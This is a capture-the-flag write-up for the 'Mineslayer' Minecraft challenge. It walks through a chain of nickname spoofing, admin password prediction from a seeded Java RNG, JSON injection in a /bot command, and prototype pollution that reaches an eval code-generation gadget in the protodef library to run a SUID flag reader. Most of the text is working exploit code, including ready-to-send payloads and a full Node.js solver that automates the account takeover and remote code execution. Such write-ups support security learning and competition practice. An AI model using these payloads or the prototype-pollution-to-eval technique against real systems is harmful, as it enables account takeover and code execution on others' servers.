# Mineslayer - Full Flag2 Writeup

I approached this challenge in two phases. First I validated the easy path to `flag1`, then I treated `/getflag` as the real target and worked backward from the code to figure out how to execute it from the Node bot process. The final `flag2` I obtained was:

```text
MCTF{Th4ts_4_sh1t_t0n_0f_g4dg3t}
```

I already had `flag1`:

```text
MCTF{M1ni_M3ssage_N3st1ng_g0es_H4rd}
```

## Target

```text
Challenge: mineslayer by blinkyy
Host: dyn-02.midnightflag.fr
Port: 10513
Connect: nc dyn-02.midnightflag.fr 10513
```

## Resources I used

I kept my analysis almost entirely inside the provided challenge files and the exploit scripts I had built along the way:

- `Mineslayer/src/main/java/com/midnight/mineslayer/FlagCommand.java`
- `Mineslayer/src/main/java/com/midnight/mineslayer/BotCommand.java`
- `Mineslayer/src/main/java/com/midnight/mineslayer/RenewCommand.java`
- `Mineslayer/src/main/java/com/midnight/mineslayer/Mineslayer.java`
- `mineslayer-bot/index.js`
- `getflag.c`
- `scripts/solve_flag2_remote.js`
- older PoCs such as `scripts/flag2_v2.js`, `scripts/flag2_v3.js`, `scripts/final_exploit.js`, and `scripts/full_chain.js`
- the bundled Node libraries under `bot/node_modules/`, especially `protodef`, `minecraft-protocol`, and `minecraft-data`

The two important habits that saved time were:

1. I read the application code before fuzzing blindly.
2. I kept failed exploit variants instead of deleting them, because the final chain was built by combining pieces from earlier attempts.

## What I learned first

The `/flag` command was intentionally only a half-win. `FlagCommand.java` simply printed a stored string:

```java
sender.sendMessage(MM.deserialize("[<yellow>FLAG_1</yellow>]: <bold>" + this.flag + "</bold>"));
```

So getting `flag1` was never going to be enough. I needed code execution somewhere that could invoke `/getflag`.

The helper binary made that goal very clear. `getflag.c` is a tiny SUID-root file reader:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    FILE *fp;
    char ch;

    setuid(0);
    setgid(0);

    fp = fopen("/root/flag.txt", "r");
    if (fp == NULL) {
        perror("Error opening file");
        return 1;
    }

    while ((ch = fgetc(fp)) != EOF) {
        putchar(ch);
    }

    fclose(fp);
    return 0;
}
```

That meant any Node-side primitive equivalent to:

```js
require('child_process').execSync('/getflag', { encoding: 'utf8' })
```

would be enough, as long as I could get the output back into chat.

## The first useful observation: `/renew` was abusable

Once I read `RenewCommand.java`, I stopped thinking about brute forcing `Administrator` directly. The command did the hard work for me:

```java
String newPassword = PasswordUtil.generate(16);
authMeApi.changePassword(username, newPassword);
sender.sendMessage(MM.deserialize("New password: <bold>" + newPassword + "</bold>"));

Player target = Bukkit.getPlayerExact(username);
if (target != null && target.isOnline()) {
    target.kick(
        Component.text("You've been flagged as a bot user.\n\n", NamedTextColor.RED)
            .append(Component.text("Please login again using this password:\n\n", NamedTextColor.GRAY))
            .append(Component.text(newPassword, NamedTextColor.WHITE)));
}
```

So if I could trick something privileged into running:

```text
/renew Administrator
```

I would get a fresh admin password and force the real admin session offline.

`Mineslayer.java` made the privilege escalation angle even better:

```java
authMeApi.registerPlayer("Administrator", pwd);
getCommand("renew").setExecutor(new RenewCommand(authMeApi));
getCommand("bot").setExecutor(new BotCommand(this));
getCommand("flag").setExecutor(new FlagCommand());

if (event.getPlayer().getName().equals("Administrator")) {
    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op Administrator");
}
```

I did not need to become some random operator. If I could log in as `Administrator`, the plugin would automatically re-op that account.

## How I got `/renew Administrator` to fire

The nickname system was the first crack. I already knew from `flag1` that MiniMessage parsing was involved, and the nickname filters were weaker than they looked. The payloads that mattered were:

```js
const NICK_PAYLOADS = [
  'x<c:Administrator>',
  'x<color:Administrator>',
  '<selector:@a[name=Administrator]>_'
]
```

The first one, `x<c:Administrator>`, was the most reliable remotely.

My idea was simple:

1. I authenticated as a normal player.
2. I changed my nick to something that rendered as `Administrator`.
3. I posted a URL to trigger the helper workflow.
4. The helper misattributed the message sender as `Administrator`.
5. It fired `/renew Administrator`.
6. The actual `Administrator` player got kicked and their password changed.

The clean signal that the takeover worked was the chat line:

```text
Administrator left the game
```

At that point I knew the server had rotated the admin password and I could move to phase two.

## Why password prediction worked

At first I treated the new admin password like a blind brute force problem. That was a mistake. The bundled scripts and local analysis showed the server was not generating passwords with strong entropy; it was using a deterministic Java-style RNG path tied to the known world seed:

```js
const WORLD_SEED = BigInt('1333333333333333337')
const CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'
```

I rewrote the Java RNG in JavaScript and generated candidate passwords in order:

```js
class JavaRandom {
  constructor (seed) {
    this.seed = (seed ^ 0x5DEECE66Dn) & ((1n << 48n) - 1n)
  }

  next (bits) {
    this.seed = (this.seed * 0x5DEECE66Dn + 0xBn) & ((1n << 48n) - 1n)
    return Number(this.seed >> (48n - BigInt(bits)))
  }

  nextInt (bound) {
    if ((bound & -bound) === bound) {
      return Math.floor((bound * this.next(31)) / (1 << 31))
    }
    let bits
    let value
    do {
      bits = this.next(31)
      value = bits % bound
    } while (bits - value + (bound - 1) < 0)
    return value
  }
}

function generatePasswords (count) {
  const rng = new JavaRandom(WORLD_SEED)
  const out = []
  for (let i = 0; i < count; i++) {
    let pwd = ''
    for (let j = 0; j < 16; j++) {
      pwd += CHARSET[rng.nextInt(CHARSET.length)]
    }
    out.push(pwd)
  }
  return out
}
```

The first working predicted password was:

```text
1HryYNeloPBLeWyY
```

Once I could renew `Administrator`, I just iterated the predicted list until I saw:

```text
Successful login!
```

At that point I had a real `Administrator` session and could use the interesting command: `/bot`.

## The `/bot` command was the real exploit surface

`BotCommand.java` was the most important file in the challenge. The whole bug was in how it turned chat input into JSON:

```java
String[] commands = input.split(";");
List<String> cmdList = new ArrayList<>();
for (String cmd : commands) {
    String trimmed = cmd.trim();
    if (!trimmed.isEmpty()) cmdList.add(trimmed);
}

StringBuilder jsonArray = new StringBuilder("[");
for (int i = 0; i < cmdList.size(); i++) {
    if (i > 0) jsonArray.append(",");
    jsonArray.append("\"").append(cmdList.get(i)).append("\"");
}
jsonArray.append("]");

String resolved = template.replace("\"commands\":[]", "\"commands\":" + jsonArray);
Files.writeString(this.configPath, resolved, StandardCharsets.UTF_8);

ProcessBuilder pb = new ProcessBuilder("node", "index.js");
pb.redirectErrorStream(true);
```

Then it streamed the bot output straight back to the player:

```java
sender.sendMessage(MM.deserialize("[<yellow>MINESLAYER</yellow>] <green>" + output)));
```

So `/bot` gave me three things at once:

- a JSON injection sink
- a way to start a fresh Node process
- an exfiltration channel back to my chat

That was enough to start aiming for code execution inside the bot wrapper.

## The Node bot merge was prototype pollution

The Node side made the second half of the chain obvious. `mineslayer-bot/index.js` loaded attacker-controlled JSON and recursively merged it:

```js
function merge(target, source) {
    for (let key of Object.keys(source)) {
        typeof target[key] !== "undefined" && typeof source[key] === "object" ?
            target[key] = merge(target[key], source[key]) :
            target[key] = source[key];
    }
    return target
}

const customConfig = JSON.parse(fs.readFileSync(path.resolve(configPath), 'utf8'))
defaultConf = {host: "localhost", username:"mineslayer-beta", port:25565}
config = merge(defaultConf, customConfig)
config.customPackets = null
const bot = mineflayer.createBot(config)
```

The important detail was the merge condition:

```js
typeof target[key] !== "undefined" && typeof source[key] === "object"
```

That meant I could do two different prototype walks:

1. `__proto__` on the top-level config object to reach `Object.prototype`
2. `username.constructor.prototype` to reach `String.prototype`

I tried a lot of variants here. The dead ends mattered:

- Setting `shell="/getflag"` alone was not enough.
- Pure `NODE_OPTIONS`-style poisoning was unreliable.
- The `host`-based string-prototype payload looked promising but still crashed remotely.

The version that actually worked was the `username` string-prototype path.

## Why I looked inside the bundled libraries

I only got the final payload after I stopped guessing and read the bundled libraries. The key path was:

`mineflayer.createBot(config)` -> `minecraft-protocol` -> `minecraft-data` -> `protodef`

Two snippets told me what kind of gadget I needed.

First, `minecraft-protocol` compiles protocol definitions:

```js
const compiler = new ProtoDefCompiler()
compiler.addTypes(require('../datatypes/compiler-minecraft'))
compiler.addProtocol(mergedProtocol, [state, direction])
const proto = compiler.compileProtoDefSync()
```

Second, `protodef` literally does:

```js
compile (code) {
  const native = this.native
  const { PartialReadError } = require('./utils')
  return eval(code)()
}
```

At that point I no longer needed a magical one-shot command injection. I just needed a payload that:

1. survived long enough to reach the compiler
2. polluted the right prototype objects
3. caused my injected JavaScript to be spliced into generated code before `eval(code)()`

The extra string-prototype fields I ended up needing were:

```js
{
  minecraftVersion: "1.0.0",
  majorVersion: "1.0",
  name: "_",
  type: "varint"
}
```

Those fields were not random. They were the minimum scaffolding that let the polluted objects survive `minecraft-data` and `protodef` long enough to hit the codegen path.

## The working payload

This was the payload that finally returned `flag2` remotely:

```js
const payload =
  'a"],' +
  '"__proto__":{"0":"(console.log(require(\'child_process\').execSync(\'/getflag\',{encoding:\'utf8\'})),0)"},' +
  '"username":{"constructor":{"prototype":{"minecraftVersion":"1.0.0","majorVersion":"1.0","name":"_","type":"varint"}}},' +
  '"version":"1.21.8",' +
  '"x":["b'
```

I sent it as:

```text
/bot a"],"__proto__":{"0":"(console.log(require('child_process').execSync('/getflag',{encoding:'utf8'})),0)"},"username":{"constructor":{"prototype":{"minecraftVersion":"1.0.0","majorVersion":"1.0","name":"_","type":"varint"}}},"version":"1.21.8","x":["b
```

What this did in practice was:

- break out of the quoted command list inside `/bot`
- inject top-level JSON fields
- prototype-pollute `Object.prototype["0"]` with a JavaScript expression
- prototype-pollute `String.prototype` through `username.constructor.prototype`
- force a concrete protocol version with `"version":"1.21.8"`
- let the Node bot continue far enough into the protocol compiler for the injected expression to run

The output came back through the plugin because `BotCommand` forwarded every bot stdout line back into chat prefixed with `[MINESLAYER]`.

## Full exploit chain in one sentence

I used a MiniMessage nickname trick to get a privileged helper to run `/renew Administrator`, predicted the new admin password from the deterministic RNG, logged in as `Administrator`, abused `/bot` JSON injection to prototype-pollute the Node process, and finally rode the `protodef` `eval` compiler into `execSync('/getflag')`.

## Solver

This is the solver I would include in a writeup because it captures the final working chain in one place. It is intentionally close to the successful script I ended up with, but cleaned up so the flow is easy to read.

```js
const mineflayer = require('../bot/node_modules/mineflayer')

const host = process.env.MC_HOST || 'dyn-02.midnightflag.fr'
const port = Number.parseInt(process.env.MC_PORT || '10513', 10)
const attackerName = process.env.MC_USERNAME || 'speedrun'
const attackerPassword = process.env.MC_PASSWORD || 'Passw0rd_123'
const triggerUrl = process.env.TRIGGER_URL || 'https://a'
const totalTimeoutMs = Number.parseInt(process.env.TIMEOUT_MS || '480000', 10)
const maxPredicted = Number.parseInt(process.env.MAX_PREDICTED || '64', 10)

const WORLD_SEED = BigInt('1333333333333333337')
const CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'
const NICK_PAYLOADS = [
  'x<c:Administrator>',
  'x<color:Administrator>',
  '<selector:@a[name=Administrator]>_'
]

function log (...args) {
  console.log(new Date().toISOString(), ...args)
}

class JavaRandom {
  constructor (seed) {
    this.seed = (seed ^ 0x5DEECE66Dn) & ((1n << 48n) - 1n)
  }

  next (bits) {
    this.seed = (this.seed * 0x5DEECE66Dn + 0xBn) & ((1n << 48n) - 1n)
    return Number(this.seed >> (48n - BigInt(bits)))
  }

  nextInt (bound) {
    if ((bound & -bound) === bound) {
      return Math.floor((bound * this.next(31)) / (1 << 31))
    }
    let bits
    let value
    do {
      bits = this.next(31)
      value = bits % bound
    } while (bits - value + (bound - 1) < 0)
    return value
  }
}

function generatePasswords (count) {
  const rng = new JavaRandom(WORLD_SEED)
  const out = []
  for (let i = 0; i < count; i++) {
    let pwd = ''
    for (let j = 0; j < 16; j++) {
      pwd += CHARSET[rng.nextInt(CHARSET.length)]
    }
    out.push(pwd)
  }
  return out
}

const predicted = generatePasswords(maxPredicted)

let done = false
let attackerBot = null
let attackerCurrentPassword = attackerPassword
let predictedStartIndex = 0
let phase1Retries = 0

function finish (code) {
  if (done) return
  done = true
  try { attackerBot?.end() } catch {}
  process.exit(code)
}

function createBot (username) {
  return mineflayer.createBot({
    host,
    port,
    username,
    version: false
  })
}

function attachAuth (bot, username, password) {
  bot.on('message', (jsonMsg, position) => {
    if (position !== 'system') return
    const text = jsonMsg.getText()
    log(`${username}:system`, JSON.stringify(text))
    if (text.includes('/register <password>')) {
      bot.chat(`/register ${password} ${password}`)
    } else if (text.includes('/login <password>')) {
      bot.chat(`/login ${password}`)
    }
  })

  bot.on('login', () => log(`${username}:login`))
  bot.on('spawn', () => log(`${username}:spawn`, `${bot.entity.position}`))
  bot.on('end', (reason) => log(`${username}:end`, JSON.stringify(reason)))
  bot.on('error', (err) => log(`${username}:error`, err.stack || err.message))
  bot.on('kicked', (reason, loggedIn) => {
    log(`${username}:kicked`, `loggedIn=${loggedIn}`, JSON.stringify(reason))
  })
}

function nextPredictionIndex (password) {
  const idx = predicted.indexOf(password)
  return idx >= 0 ? idx + 1 : predictedStartIndex
}

function schedulePhase1Retry (why, delay = 1500) {
  if (done) return
  phase1Retries += 1
  log('phase1:retry', why, `attempt=${phase1Retries}`)
  setTimeout(runPhase1, delay)
}

function runPhase1 () {
  if (done) return
  let nickSet = false
  let renewTriggered = false
  let authReady = false
  let retryScheduled = false
  let nickAttempt = 0
  const posted = { count: 0 }

  const bot = createBot(attackerName)
  attackerBot = bot
  attachAuth(bot, attackerName, attackerCurrentPassword)

  function tryNextNick () {
    if (done || nickSet || nickAttempt >= NICK_PAYLOADS.length) return
    const nick = NICK_PAYLOADS[nickAttempt++]
    const command = nick.startsWith('<selector:') ? `/sn set ${nick}` : `/nick set ${nick}`
    log('phase1:command', command)
    bot.chat(command)
  }

  function postTrigger () {
    if (done || renewTriggered || posted.count >= 5) return
    posted.count += 1
    log('phase1:trigger', `count=${posted.count}`)
    bot.chat(triggerUrl)
    setTimeout(postTrigger, 900)
  }

  bot.on('message', (jsonMsg, position) => {
    if (position !== 'system') return
    const text = jsonMsg.getText()

    if (!authReady && text.includes('Successful login!')) {
      authReady = true
      setTimeout(tryNextNick, 50)
      return
    }

    if (!nickSet && text.includes('Changed your nickname to')) {
      nickSet = true
      log('phase1:nick-set', JSON.stringify(text))
      setTimeout(postTrigger, 250)
      return
    }

    if (!nickSet && (
      text.includes('You cannot name yourself administrator') ||
      text.includes('that is the username of another player') ||
      text.includes('disallowed formatting tags')
    )) {
      if (nickAttempt < NICK_PAYLOADS.length) {
        setTimeout(tryNextNick, 200)
        return
      }
      if (retryScheduled) return
      retryScheduled = true
      try { bot.end() } catch {}
      schedulePhase1Retry('nick-blocked', 2000)
      return
    }

    if (!renewTriggered && nickSet && posted.count > 0 && text === 'Administrator left the game') {
      renewTriggered = true
      log('phase1:administrator-renewed')
      setTimeout(() => {
        try { bot.end() } catch {}
        runPhase2()
      }, 500)
    }
  })

  bot.on('kicked', (reason) => {
    const text = typeof reason === 'string' ? reason : JSON.stringify(reason)
    const match = text.match(/([A-Za-z0-9_]{16})/)
    if (match) {
      if (retryScheduled) return
      retryScheduled = true
      attackerCurrentPassword = match[1]
      predictedStartIndex = nextPredictionIndex(attackerCurrentPassword)
      log('phase1:attacker-renewed', `pwd=${attackerCurrentPassword}`, `predictedStartIndex=${predictedStartIndex}`)
      schedulePhase1Retry('attacker-renewed', 2000)
    }
  })

  setTimeout(() => {
    if (done || renewTriggered || retryScheduled) return
    retryScheduled = true
    try { bot.end() } catch {}
    schedulePhase1Retry('phase1-timeout', 2000)
  }, 40000)
}

function runPhase2 () {
  if (done) return
  const ordered = predicted.slice(predictedStartIndex).concat(predicted.slice(0, predictedStartIndex))
  let attempt = 0

  function tryOne () {
    if (done) return
    if (attempt >= ordered.length) {
      log('phase2:passwords-exhausted')
      finish(1)
      return
    }

    const pwd = ordered[attempt++]
    const bot = createBot('Administrator')
    let loginAttempted = false
    let authed = false
    let nextQueued = false
    attachAuth(bot, 'Administrator', pwd)

    function queueNext (delay = 1200, advance = true) {
      if (done || authed || nextQueued) return
      nextQueued = true
      if (!advance) attempt--
      setTimeout(tryOne, delay)
    }

    bot.on('message', (jsonMsg, position) => {
      if (position !== 'system') return
      const text = jsonMsg.getText()
      if (!loginAttempted && text.includes('/login <password>')) {
        loginAttempted = true
        log('phase2:try', pwd)
      }
      if (text.includes('Wrong password')) {
        try { bot.end() } catch {}
      } else if (!authed && text.includes('Successful login!')) {
        authed = true
        log('phase2:admin-authenticated', pwd)
        setTimeout(() => runPhase3(bot, pwd), 500)
      }
    })

    bot.on('end', () => queueNext())

    bot.on('kicked', (reason) => {
      const text = typeof reason === 'string' ? reason : JSON.stringify(reason)
      if (text.includes('throttled')) {
        queueNext(6000, false)
        return
      }
      if (text.includes('same username')) {
        queueNext(5000, false)
        return
      }
      queueNext()
    })

    setTimeout(() => {
      if (!authed && !done) {
        try { bot.end() } catch {}
      }
    }, 12000)
  }

  tryOne()
}

function runPhase3 (admin, pwd) {
  if (done) return
  let sawFlag2 = false

  const payloads = [
    {
      name: 'flag1-via-injected-admin-bot',
      raw: `/flag"],"username":"Administrator","password":"${pwd}","x":["y`
    },
    {
      name: 'numeric-codegen-via-string-prototype-host',
      raw: 'a"],"__proto__":{"0":"(console.log(require(\'child_process\').execSync(\'/getflag\',{encoding:\'utf8\'})),0)"},"host":{"constructor":{"prototype":{"minecraftVersion":"1.0.0","majorVersion":"1.0","name":"_","type":"varint"}}},"version":"1.21.8","x":["b'
    },
    {
      name: 'numeric-codegen-via-string-prototype-username',
      raw: 'a"],"__proto__":{"0":"(console.log(require(\'child_process\').execSync(\'/getflag\',{encoding:\'utf8\'})),0)"},"username":{"constructor":{"prototype":{"minecraftVersion":"1.0.0","majorVersion":"1.0","name":"_","type":"varint"}}},"version":"1.21.8","x":["b'
    }
  ]

  admin.on('message', (jsonMsg, position) => {
    if (position !== 'system') return
    const text = jsonMsg.getText()
    if (text.includes('FLAG_1') || text.includes('MCTF{')) {
      log('phase3:flag-line', text)
    }
    if (text.includes('MINESLAYER')) {
      log('phase3:bot-output', text)
    }
    if (text.includes('MCTF{') && !text.includes('FLAG_1')) {
      sawFlag2 = true
      finish(0)
    }
  })

  admin.chat('/flag')

  let delay = 2500
  for (const payload of payloads) {
    setTimeout(() => {
      if (done) return
      log('phase3:payload', payload.name)
      admin.chat('/bot ' + payload.raw)
    }, delay)
    delay += 12000
  }

  setTimeout(() => {
    if (!sawFlag2 && !done) {
      log('phase3:finished-without-flag2')
      finish(2)
    }
  }, delay + 15000)
}

log('target', `${host}:${port}`)
log('predicted[0..4]', JSON.stringify(predicted.slice(0, 5)))
runPhase1()

setTimeout(() => {
  log('global-timeout')
  finish(99)
}, totalTimeoutMs)
```

## Final result

The final remote result I got from the working `username` payload was:

```text
MCTF{Th4ts_4_sh1t_t0n_0f_g4dg3t}
```

The main lesson I took from this challenge is that the cleanest route to RCE was not a direct command injection at all. The real chain was: trusted chat rendering bug -> admin password rotation -> deterministic password prediction -> JSON injection -> prototype pollution -> code generation gadget -> `eval` -> `/getflag`.
